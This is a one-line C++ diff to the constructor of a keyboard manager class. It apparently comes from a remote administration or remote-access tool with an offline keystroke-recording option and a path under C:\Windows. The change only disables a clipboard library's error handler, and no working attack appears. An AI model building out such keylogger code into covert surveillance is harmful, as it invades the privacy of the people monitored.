@@ -37,6 +37,7 @@
 
 CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user) : CManager(pClient)
 {
+    clip::set_error_handler(NULL);
     m_bIsOfflineRecord = offline;
 
     char path[MAX_PATH] = { "C:\\Windows\\" };
